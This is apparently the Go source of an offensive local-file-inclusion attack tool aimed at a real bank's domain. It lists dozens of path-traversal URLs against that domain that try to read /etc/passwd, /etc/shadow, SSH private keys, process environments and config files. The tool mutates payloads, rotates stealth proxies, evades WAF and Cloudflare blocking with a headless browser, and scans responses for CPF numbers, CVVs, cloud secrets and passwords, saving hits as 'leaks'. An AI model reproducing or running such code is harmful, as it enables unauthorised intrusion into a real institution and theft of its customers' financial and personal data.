package main

import (
	"bufio"
	"context"
	"crypto/rand"
	"encoding/binary"
	"fmt"
	"io"
	mathrand "math/rand"
	"net/http"
	"os"
	"regexp"
	"strings"
	"sync"
	"time"

	"github.com/schollz/progressbar" // Barra de progresso
	"lfitessla/aibridge"
	"lfitessla/analyzer"
	"lfitessla/browserexec"
	"lfitessla/headers"
	"lfitessla/http2mux"
	"lfitessla/mutador"
	"lfitessla/proxy"
	"lfitessla/strategies"
	"lfitessla/telemetry"
	"lfitessla/injector"
)

/// Suporte a múltiplos métodos HTTP por alvo
type Alvo struct {
	URL    string
	Method string
}

// Lista de alvos vulneráveis, incluindo novos alvos com técnicas de bypass
var alvosBase = []Alvo{
	// Endpoints gerais com parâmetros comuns de LFI
	{"https://app.nubank.com.br/beta/index.php?page=", "GET"},
	{"https://app.nubank.com.br/beta/index.php?file=", "GET"},
	{"https://app.nubank.com.br/beta/download.php?file=", "GET"},
	{"https://app.nubank.com.br/beta/view.php?doc=", "GET"},
	{"https://app.nubank.com.br/beta/template.php?path=", "GET"},

	// Subdiretórios comuns e uploads
	{"https://app.nubank.com.br/beta/uploads/file=", "GET"},
	{"https://app.nubank.com.br/beta/admin/config.php?file=", "GET"},
	{"https://app.nubank.com.br/beta/assets/data.php?file=", "GET"},
	{"https://app.nubank.com.br/beta/include/template.php?path=", "GET"},

	// Diretórios sensíveis típicos para LFI
	{"https://app.nubank.com.br/beta/var/www/html/index.php?file=", "GET"},
	{"https://app.nubank.com.br/beta/etc/passwd?file=", "GET"},
	{"https://app.nubank.com.br/beta/home/user/config.php?path=", "GET"},
	{"https://app.nubank.com.br/beta/root/.ssh/id_rsa?file=", "GET"},

	// Novos alvos com bypasses (path traversal, null byte, etc.)
	{"https://app.nubank.com.br/beta/painel.php?page=../../../../../etc/passwd", "GET"},
	{"https://app.nubank.com.br/beta/painel.php?page=%252e%252e%252f%252e%252e%252fetc%252fpasswd", "GET"},
	{"https://app.nubank.com.br/beta/painel.php?page=../../../../../etc/passwd%00", "GET"},
	{"https://app.nubank.com.br/beta/index.php?file=../../../../../etc/shadow%00", "GET"},
	{"https://app.nubank.com.br/beta/viewer.php?file=../../../../../var/log/auth.log", "GET"},
	{"https://app.nubank.com.br/beta/viewer.php?file=../../../../../var/log/auth.log%00", "GET"},
	{"https://app.nubank.com.br/beta/admin.php?include=../../../../../../proc/self/environ", "GET"},
	{"https://app.nubank.com.br/beta/admin.php?include=../../../../../../proc/self/environ%00", "GET"},
	{"https://app.nubank.com.br/beta/dashboard.php?path=....//....//etc/passwd", "GET"},
	{"https://app.nubank.com.br/beta/dashboard.php?path=..%5C..%5Cetc%5Cpasswd", "GET"},
	{"https://app.nubank.com.br/beta/admin/config.php?config=../../../etc/passwd", "GET"},
	{"https://app.nubank.com.br/beta/settings.php?file=../../../../../etc/passwd", "GET"},
	{"https://app.nubank.com.br/beta/settings.php?file=../../../../../etc/passwd%00", "GET"},
	{"https://app.nubank.com.br/beta/download.php?file=../../../../../../var/log/apache2/access.log", "GET"},
	{"https://app.nubank.com.br/beta/download.php?file=../../../../../../var/log/apache2/access.log%00", "GET"},
	{"https://app.nubank.com.br/beta/wp-content/plugins/vulnerable-plugin/include.php?file=../../../../../../wp-config.php", "GET"},
	{"https://app.nubank.com.br/beta/index.php?option=com_webtv&controller=../../../../../../etc/passwd%00", "GET"},
	{"https://app.nubank.com.br/beta/index.php?option=com_config&view=../../../../../../configuration.php", "GET"},
	{"https://app.nubank.com.br/beta/index.php?file=../../../../../home/admin/.ssh/authorized_keys", "GET"},
	{"https://app.nubank.com.br/beta/portal.php?page=../../../../../../etc/issue", "GET"},
	{"https://app.nubank.com.br/beta/portal.php?page=../../../../../../etc/hostname", "GET"},
	{"https://app.nubank.com.br/beta/portal.php?page=../../../../../../var/www/html/index.php", "GET"},

	// Tentativas de outros métodos HTTP
	{"https://app.nubank.com.br/beta/api/upload.php", "POST"},
	{"https://app.nubank.com.br/beta/api/delete.php", "DELETE"},
	{"https://app.nubank.com.br/beta/api/update.php?file=", "PUT"},

	// Outras extensões e arquivos
	{"https://app.nubank.com.br/beta/index.jsp?file=", "GET"},
	{"https://app.nubank.com.br/beta/include/config.pl?path=", "GET"},
	{"https://app.nubank.com.br/beta/admin/config.asp?file=", "GET"},
}


const (
	payloadsFile = "C:/Users/Paulo/Desktop/lfi-tessla-pro/backend/python/ia_payload_gen/payloads/payloads_gerados.txt"
	outputDir     = "./vazamentos"
	threadsAtivas = 20
)

var regexSensivel = []*regexp.Regexp{
	regexp.MustCompile(`(?i)cpf[:=]\s*\d{3}\.\d{3}\.\d{3}-\d{2}`),
	regexp.MustCompile(`(?i)cvv[:=]?\s*\d{3}`),
	regexp.MustCompile(`(?i)aws[_-]?secret`),
	regexp.MustCompile(`(?i)db[_-]?pass`),
	regexp.MustCompile(`(?i)eyJ[A-Za-z0-9_-]{10,}`),
	regexp.MustCompile(`(?i)BEGIN TRANSACTION`),
	regexp.MustCompile(`(?i)senha[:=]?\s*\w+`),
	regexp.MustCompile(`(?i)usuario[:=]?\s*\w+`),
}

func main() {
	// ✅ Quantum-inspired PRNG: seed math/rand via crypto/rand
	var seed int64
	_ = binary.Read(rand.Reader, binary.LittleEndian, &seed)
	mathrand.Seed(seed)

	// Criação do diretório de vazamentos
	os.MkdirAll(outputDir, os.ModePerm)

	// Carregar payloads
	payloads, err := carregarPayloads(payloadsFile)
	if err != nil {
		fmt.Printf("❌ Erro ao carregar payloads: %v\n", err)
		return
	}

	// Barra de progresso
	pb := progressbar.New(len(alvosBase) * len(payloads))
	var wg sync.WaitGroup
	sem := make(chan struct{}, threadsAtivas)

	// Execução dos ataques
	for _, alvo := range alvosBase {
		for _, payload := range payloads {
			alvo := alvo
			payload := payload

			wg.Add(1)
			sem <- struct{}{}

			go func(a Alvo, p string) {
				defer wg.Done()
				executarAtaque(a, p)
				<-sem
				pb.Add(1)
			}(alvo, payload)
		}
	}

	wg.Wait()
	fmt.Println("✅ Ataques finalizados. Verifique a pasta /vazamentos.")
}

// CarregarPayloads carrega os payloads do arquivo de texto
func carregarPayloads(path string) ([]string, error) {
	var payloads []string
	file, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer file.Close()
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		linha := strings.TrimSpace(scanner.Text())
		if linha != "" && !strings.HasPrefix(linha, "---") {
			payloads = append(payloads, linha)
		}
	}
	return payloads, nil
}

// ExecutarAtaque realiza o ataque LFI
func executarAtaque(alvo Alvo, payload string) {
	// Realiza mutação do payload
	for _, mutado := range mutador.MutarPayload(payload) {
		urlFinal := alvo.URL + mutado

		// Monta requisição
		req, err := http.NewRequest(alvo.Method, urlFinal, nil)
		if err != nil {
			fmt.Printf("❌ Erro na requisição %s: %v\n", urlFinal, err)
			continue
		}

		// Headers realistas
		h := headers.GerarHeadersRealistas()
		for k, v := range h {
			req.Header[k] = v
		}

		// Proxy furtivo com roteamento adaptativo (uTLS ou HTTP/2)
		proxySel, client, err := stealthrouter.EscolherTransport("", "")
		if err != nil {
			fmt.Printf("❌ Erro ao criar cliente furtivo: %v\n", err)
			continue
		}

		// Cross-vantage: proxy secundário pra evasão comparativa
		go func(originalReq *http.Request) {
			proxySec := proxy.SelecionarOutroProxy(proxySel)
			if client2, e2 := http2mux.ClientHTTP2ComProxy(proxySec.Address); e2 == nil {
				if resp2, e3 := client2.Do(originalReq.Clone(context.TODO())); e3 == nil {
					diff := analyzer.CompararRespostas(nil, resp2)
					if diff {
						fmt.Println("🔁 Diferença entre vantage points → evasão detectável")
					}
					resp2.Body.Close()
				}
			}
		}(req)

		// Executa requisição principal
		start := time.Now()
		resp, err := client.Do(req)
		duration := time.Since(start).Milliseconds()
		if err != nil {
			fmt.Printf("⚠️ Erro em %s: %v\n", urlFinal, err)
			proxy.MarcarFalha(proxySel)
			continue
		}

		bodyBytes, err := io.ReadAll(resp.Body)
		resp.Body.Close()
		if err != nil {
			fmt.Printf("❌ Erro lendo corpo: %v\n", err)
			continue
		}
		body := string(bodyBytes)

		// Análise de status HTTP
		if resp.StatusCode >= 500 {
			fmt.Printf("⚠️ HTTP %d (erro server) → %s\n", resp.StatusCode, urlFinal)
			proxy.MarcarFalha(proxySel)
			continue
		} else if resp.StatusCode == 403 {
			fmt.Println("🚧 Bloqueio WAF (403). Tentando fallback...")
			fallbackResp := injector.TentarFallback(alvo.URL, mutado)
			if fallbackResp.Success {
				fmt.Printf("✅ Fallback ativo → via %s\n", fallbackResp.Canal)
				salvarResposta(mutado, alvo.URL, fallbackResp.Body)
				continue
			}
		}

		// Detecta WAF
		waf := analyzer.DetectarWAF(resp.StatusCode, resp.Header, body)
		if waf != "" {
			fmt.Printf("🛡️ %s → %s\n", waf, urlFinal)
			if strings.Contains(strings.ToLower(waf), "cloudflare") {
				fmt.Println("👁️ Cloudflare detectado → stealth browser...")
				if brresp, err := browserexec.ExecutarNoBrowser(urlFinal, mutado); err == nil && brresp.Success && respostaContemVazamento(brresp.Body) {
					salvarResposta(mutado, alvo.URL, brresp.Body)
					continue
				}
			}
		}

		// Vazamento?
		if respostaContemVazamento(body) {
			salvarResposta(mutado, alvo.URL, body)
			fmt.Printf("💥 VAZAMENTO: %s\n", urlFinal)
		}

		// Telemetria
		snippet := body
		if len(body) > 200 {
			snippet = body[:200]
		}
		classif := analyzer.ClassificarVazamento(body)
		telemetry.EnviarTelemetry(telemetry.TelemetryData{
			Payload:    mutado,
			StatusCode: resp.StatusCode,
			LatencyMs:  duration,
			WAF:        classif,
			Snippet:    snippet,
		})

		// Reforço IA
		aibridge.EnviarFeedbackReforco(mutado, resp.StatusCode, duration, waf)
	}
}

// RespostaContemVazamento verifica se a resposta contém dados sensíveis
func respostaContemVazamento(body string) bool {
	for _, re := range regexSensivel {
		if re.MatchString(body) {
			return true
		}
	}
	return false
}

// SalvarResposta salva a resposta de um vazamento em arquivo
func salvarResposta(payload, base, body string) {
	timestamp := time.Now().Format("2006-01-02_15-04-05")
	safePayload := strings.ReplaceAll(payload, "/", "_")
	basePart := strings.Split(base, "?")[1]
	filename := fmt.Sprintf("%s/vazamento_%s__%s__%s.txt", outputDir, basePart, safePayload, timestamp)
	if err := os.WriteFile(filename, []byte(body), 0644); err != nil {
		fmt.Printf("❌ Erro ao salvar resposta: %v\n", err)
	}
}
